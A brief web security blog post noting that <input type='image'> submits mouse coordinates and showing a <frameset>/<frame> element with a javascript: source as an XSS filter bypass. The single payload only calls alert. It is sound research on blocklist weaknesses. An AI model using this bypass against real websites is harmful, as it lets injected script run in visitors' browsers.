---
layout: post
title: HTML facts﹕ <​in​put ​ty​pe=​"i​mag​e"​> a​nd a <​f​ram​e​> XSS bypass
author: Jorian Woltjer
date: 2025-10-05
tags: [html, xss, bypass]
profile_picture: /assets/images/JW_Logo_V2_Transparant.webp
handle: j0r1an
social_links: [https://x.com/J0R1AN, https://jorianwoltjer.com/]

description: "Two HTML fun facts: <input type='image'> sending mouse-coordinates & using the <frame> tag for XSS filter bypasses"
permalink: /research/html-facts-input-image-frame-xss
---

Some HTML facts I learned today:

1. First one's just weird likely not useful but [`<input type="image">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/input/image) is a thing apparently. It acts as a submit button and sends `x`/`y` coordinates of your mouse as extra parameters. who the heck uses this.
2. Another that may be useful for XSS filter bypasses, as it's an unusual tag name, which a blocklist may miss. If your input starts *before the body* you can use the [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/frame) element inside of a [`<frameset>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/frameset):

```html
<frameset>
  <frame src="javascript:alert(origin)">
</frameset>
```
